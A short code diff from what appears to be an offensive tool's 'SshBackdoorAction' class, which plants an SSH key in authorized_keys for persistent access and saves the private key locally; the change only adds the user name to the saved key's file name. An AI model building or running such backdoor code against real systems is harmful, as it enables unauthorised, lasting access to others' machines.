@@ -131,7 +131,7 @@ class SshBackdoorAction(BaseAction):
             return "❌ Failed to verify public key in authorized_keys"
 
         # Save private key locally
-        local_save_path = Path.cwd() / "id_ed25519"
+        local_save_path = Path.cwd() / f"id_ed25519_{user}"
         try:
             local_save_path.write_text(private_key_pem)
             local_save_path.chmod(0o600)
